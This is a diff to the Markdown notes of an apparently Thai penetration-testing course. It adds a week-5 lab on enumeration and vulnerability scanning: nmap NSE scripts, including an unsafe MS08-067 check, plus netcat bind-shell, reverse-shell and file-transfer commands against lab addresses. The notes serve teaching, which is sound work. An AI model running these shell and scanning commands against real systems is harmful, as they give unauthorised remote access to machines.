@@ -350,7 +350,7 @@ A - Availability ข้อมูลต้องมีความพร้อม
   ```
 --- 
 ## Week 3@10 Dec 2022
-หยุดรัฐธรรมนูญ
+หยุดรัฐธรรมนูญ โดยชดเชยวันอาทิตย์ที่ 15 ม.ค.65
 
 --- 
 ## Week 4@17 Dec 2022
@@ -530,7 +530,7 @@ retrieving directory information from the server and so on.
 --- 
 
 ## Week 5@24 Dec 2022
-## Lec
+## Lec & LAB
 - Enumeration
   - Email ID
   - Default Password
@@ -540,21 +540,87 @@ retrieving directory information from the server and so on.
   - Services and Ports to Enumerate
   - Research Potential Vulnerability 
     - [Exploit DB](https://www.exploit-db.com/)
-  ```bash
-  searchspoit smb
-  ```
+    - Searchspoit
+     ```bash
+      searchspoit smb
+    ```
+- Vulnerability Scanning
+  - NMAP NSE script 
+    ```bash
+    ls -ls /usr/share/nmap/scripts 
+    # Help NSE Script
+    nmap --script=help dns-zone-transfer
+    # DNS
+    nmap --script=dns-zone-transfer -p 53 ns.server.test 
+    # SMB
+    ls -la /usr/share/nmap/scripts/smb*
+    nmap 10.10.10.10 --script=smb-os-discovery
+    # In this case, Nmap identifies that the specific SMB service is missing at least one critical patch for the MS08-067212 vulnerability.
+    nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.10.10.10
+    ```
+  - Connection Testing 
+    - Binding Shell 
+      ```bash 
+      # Attacker(10.10.10.1) ---> Victim (10.10.10.2)
+      ## Attacker command (KALI Linux) 
+      nc 10.10.10.2 4444 
+
+      ## Victim (Windows OS)
+      nc.exe -vnlp 4444 -e cmd.exe 
+      ## Victim (Unix OS)
+      nc -vnlp 4444 -e /bin/bash
+      ```
+    - Reverse Shell
+       ```bash 
+      # Attacker(10.10.10.1) <--- Victim (10.10.10.2)
+      ## Attacker command (KALI Linux) 
+      nc -lvnp 4444
+
+      ## Victim (Windows OS)
+      nc.exe 10.10.10.1 4444 -e cmd.exe 
+      ## Victim (Unix OS)
+      nc 10.10.10.1 -e /bin/bash
+      ```
+    - Upload file by Netcat 
+      ```bash 
+      # Attacker(10.10.10.1) ---> Victim (10.10.10.2)
+      ## Attacker command (KALI Linux) 
+      nc 10.10.10.2 4444 < file.txt
+
+      ## Victim (Windows OS)
+      nc.exe –vnlp 4444 > file.txt
+      ## Victim (Unix OS)
+      nc –vnlp 4444 > file.txt
+      ```
+    - Download File by Netcat
+      ```bash
+      # Attacker(10.10.10.1) ---> Victim (10.10.10.2)
+      ## Attacker command (KALI Linux) 
+      nc 10.10.10.2 4444 > file.txt
+
+      ## Victim (Windows OS)
+      nc.exe –vnlp 4444 < file.txt
+      ## Victim (Unix OS)
+      nc –vnlp 4444 < file.txt
+      ```
+    - Python HTTP Server
+      ```python
+      python -m SimpleHTTPServer [port]      #Version 2
+      python3 -m http.server   [port]        #Version 3 
+      ```
+    - [Shell Generator](https://www.revshells.com/)
+
 --- 
 ## Week 6@31 Dec 2022
-หยุดวันสิ้นปีใหม่
+
+หยุดวันสิ้นปีใหม่ โดยชดเชยวันอาทิตย์ที่ 22 ม.ค.65
 
 --- 
 ## Week 7@7 Jan 2023
 ## Lec
-- VA Scan
-## Lab
-- Nessus 
-- OpenVAS
-- Nakivo
+
+- Nessus
+- OpenVA
 
 --- 
 ## Week 8@14 Jan 2023
